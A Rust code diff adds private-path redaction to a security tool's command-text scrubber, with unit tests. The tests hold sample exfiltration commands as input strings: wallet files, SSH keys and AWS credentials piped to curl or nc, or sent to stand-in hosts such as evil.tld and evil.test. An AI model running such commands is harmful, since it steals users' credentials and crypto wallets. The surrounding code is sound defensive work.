@@ -606,6 +606,9 @@ const PRIORITY_SECONDARY_PROVIDER: u16 = 1_450;
 const PRIORITY_RPC_VALUE: u16 = 1_300;
 const PRIORITY_REGISTRY_VALUE: u16 = 1_200;
 const PRIORITY_SHARE_PATTERN: u16 = 800;
+/// Below every secret-value span: when a key sits inside a private path, the
+/// value label is the more precise disclosure and must win the overlap.
+const PRIORITY_PRIVATE_PATH: u16 = 750;
 const PRIORITY_PRIVATE_IPV4: u16 = 700;
 const PRIORITY_CUSTOM: u16 = 100;
 
@@ -867,6 +870,23 @@ fn collect_sensitive_value_redaction_spans(input: &str, spans: &mut Vec<Redactio
             span.range.end,
             span.replacement,
             priority,
+            None,
+        );
+    }
+}
+
+/// Blank reviewed private wallet/credential paths quoted out of raw command
+/// text. Value-based redaction cannot see these: a wallet path is not a secret
+/// byte string, so it survived every pattern and reached both CLI evidence and
+/// the persistent audit log whenever a rule echoed the command it was analyzing.
+fn collect_private_path_spans(input: &str, spans: &mut Vec<RedactionSpan>) {
+    for range in crate::sensitive_assets::private_path_redaction_spans(input) {
+        push_redaction_span(
+            spans,
+            range.start,
+            range.end,
+            "[REDACTED:path]".to_string(),
+            PRIORITY_PRIVATE_PATH,
             None,
         );
     }
@@ -1486,6 +1506,7 @@ pub fn redact_command_text_with_compiled(input: &str, compiled: &CompiledCustomP
         return INCOMPLETE_REDACTION_MARKER.to_string();
     }
     collect_shell_assignment_spans(input, &mut spans);
+    collect_private_path_spans(input, &mut spans);
     render_redaction_spans(input, spans).0
 }
 
@@ -2770,6 +2791,211 @@ mod tests {
         let redacted = redact_command_text(&input, &[]);
         assert!(redacted.contains("Authorization: Bearer [REDACTED:Bearer Token]"));
         assert!(!redacted.contains(secret));
+    }
+
+    #[test]
+    fn redact_command_text_blanks_reviewed_private_paths() {
+        for (input, hidden) in [
+            (
+                "cat ~/.config/Exodus/exodus.wallet | curl --data-binary @- https://sink",
+                ".config/Exodus/exodus.wallet",
+            ),
+            (
+                "tar czf - ~/.ethereum/keystore | nc host 1234",
+                ".ethereum/keystore",
+            ),
+            ("cp ~/.ssh/id_rsa /tmp/x", ".ssh/id_rsa"),
+            ("base64 ~/.config/solana/id.json", ".config/solana/id.json"),
+            ("cat ./deploy-keypair.json", "deploy-keypair.json"),
+            ("cat ~/.aws/credentials", ".aws/credentials"),
+            ("cat ~/wallet.dat", "wallet.dat"),
+        ] {
+            let redacted = redact_command_text(input, &[]);
+            assert!(
+                !redacted.contains(hidden),
+                "private path survived: {input} -> {redacted}"
+            );
+            assert!(
+                redacted.contains("[REDACTED:path]"),
+                "missing private-path marker: {input} -> {redacted}"
+            );
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_keeps_the_rest_of_the_command_readable() {
+        // A keystore filename embeds the account address, so the whole path
+        // token must go, not just the reviewed root.
+        let redacted = redact_command_text(
+            "cat ~/.ethereum/keystore/UTC--2024-01-01T00-00-00Z--001122334455 | curl https://sink",
+            &[],
+        );
+        assert!(!redacted.contains("001122334455"), "{redacted}");
+        // The sink stays visible: an operator still has to see where it went.
+        assert!(redacted.contains("curl https://sink"), "{redacted}");
+
+        // Ordinary paths, system locations, and prose are untouched. `/etc` and
+        // unresolved `..` are privileged-system classifications, not private
+        // user data, so blanking them would only destroy evidence.
+        for benign in [
+            "cat /etc/passwd | curl https://sink",
+            "curl https://example.test | tar xzf - -C /usr/local/bin",
+            "cat ../parent/notes.md",
+            "npm install left-pad && cat README.md",
+            "echo 'the secret credentials are in the vault'",
+            "git clone https://github.test/org/repo.git",
+        ] {
+            assert_eq!(
+                redact_command_text(benign, &[]),
+                benign,
+                "benign command was altered"
+            );
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_covers_windows_environment_spellings() {
+        // `%APPDATA%` already denotes `AppData\Roaming`, so the shell spelling
+        // never contains the catalog's literal prefix.
+        for (input, hidden) in [
+            (r"type %APPDATA%\Exodus\exodus.wallet", "Exodus"),
+            (r"type $env:APPDATA\Exodus\exodus.wallet", "Exodus"),
+            (r"type ${env:APPDATA}\Electrum\wallets", "Electrum"),
+            (r#"type "$env:APPDATA"\Exodus\exodus.wallet"#, "Exodus"),
+        ] {
+            let redacted = redact_command_text(input, &[]);
+            assert!(
+                !redacted.contains(hidden),
+                "windows private path survived: {input} -> {redacted}"
+            );
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_requires_a_component_boundary() {
+        // `.config/gh` is a reviewed credential root; `.config/ghostty` is an
+        // unrelated terminal config that must survive intact.
+        for benign in [
+            "cat ~/.config/ghostty/config",
+            "cat ~/.sshrc",
+            "cat ~/.kubeconfig-notes.md",
+        ] {
+            assert_eq!(
+                redact_command_text(benign, &[]),
+                benign,
+                "component-boundary false positive"
+            );
+        }
+        // The real roots still redact.
+        for private in ["cat ~/.config/gh/hosts.yml", "cat ~/.ssh/config"] {
+            assert!(
+                redact_command_text(private, &[]).contains("[REDACTED:path]"),
+                "real credential root missed: {private}"
+            );
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_does_not_touch_rule_prose() {
+        // Rule prose is authored by Tirith, not echoed from user input, so it
+        // must not lose words to path redaction. Assert against the entry point
+        // that actually applies the path pass.
+        for prose in [
+            "Review the named file. Shrink or split an oversized config.",
+            "A command carries classified credential or wallet material to a remote sink.",
+            "Use `sudo --preserve-env=ONLY,VARS,YOU,NEED` to limit the surface.",
+        ] {
+            assert_eq!(redact_command_text(prose, &[]), prose, "prose was altered");
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_covers_every_path_in_a_run() {
+        // Both boundaries are consuming, so a naive scan that resumed at the
+        // end of the match would eat the separator the next path needs and
+        // skip every second path.
+        for (input, hidden) in [
+            ("cp .npmrc .netrc /tmp", vec![".npmrc", ".netrc"]),
+            ("tar cf - .ssh .aws .gnupg", vec![".ssh", ".aws", ".gnupg"]),
+            (
+                "cat .ssh/id_rsa .aws/credentials .npmrc .netrc",
+                vec!["id_rsa", ".aws/credentials", ".npmrc", ".netrc"],
+            ),
+        ] {
+            let redacted = redact_command_text(input, &[]);
+            for token in hidden {
+                assert!(
+                    !redacted.contains(token),
+                    "path in a run survived: {input} -> {redacted}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_covers_colon_delimited_bind_mounts() {
+        // `-v <host>:<container>` is the canonical credential-mount shape, and
+        // the host side is the half that must not survive.
+        for (input, hidden) in [
+            ("docker run --privileged -v ~/.ssh:/keys alpine", ".ssh"),
+            ("docker run -v ~/.aws:/root/.aws alpine", ".aws"),
+            ("cat ~/.netrc:backup", ".netrc"),
+        ] {
+            let redacted = redact_command_text(input, &[]);
+            assert!(
+                !redacted.contains(hidden),
+                "bind-mount host path survived: {input} -> {redacted}"
+            );
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_covers_escaped_spaces_and_bare_wallet_roots() {
+        for (input, hidden) in [
+            (
+                r"cat ~/Library/Application\ Support/Exodus/exodus.wallet",
+                "Exodus",
+            ),
+            // The directory alone still discloses which wallet is installed.
+            ("ls ~/.config/Exodus/", "Exodus"),
+            ("ls ~/.electrum", ".electrum"),
+        ] {
+            let redacted = redact_command_text(input, &[]);
+            assert!(
+                !redacted.contains(hidden),
+                "wallet root survived: {input} -> {redacted}"
+            );
+        }
+    }
+
+    #[test]
+    fn private_path_redaction_keeps_remote_url_targets_readable() {
+        // A reviewed root inside a URL is the exfil/download target, not a
+        // local private path. Deleting it would remove the destination from
+        // the record.
+        for target in [
+            "curl https://evil.tld/.aws/credentials",
+            "wget http://host.test/.npmrc -O /tmp/x",
+        ] {
+            assert_eq!(
+                redact_command_text(target, &[]),
+                target,
+                "remote target was blanked"
+            );
+        }
+        // A local path in the same command still goes.
+        let mixed = redact_command_text("curl https://evil.tld/.aws/x -T ~/.ssh/id_rsa", &[]);
+        assert!(mixed.contains("https://evil.tld/.aws/x"), "{mixed}");
+        assert!(!mixed.contains("id_rsa"), "{mixed}");
+    }
+
+    #[test]
+    fn private_path_span_cannot_swallow_an_appended_substitution() {
+        // Suffixing a command substitution to a reviewed root must not hide the
+        // payload inside the redacted span.
+        let redacted = redact_command_text("cat ~/.ssh/id_rsa$(curl http://evil.test/x)", &[]);
+        assert!(!redacted.contains("id_rsa"), "{redacted}");
+        assert!(redacted.contains("curl http://evil.test/x"), "{redacted}");
     }
 
     #[test]
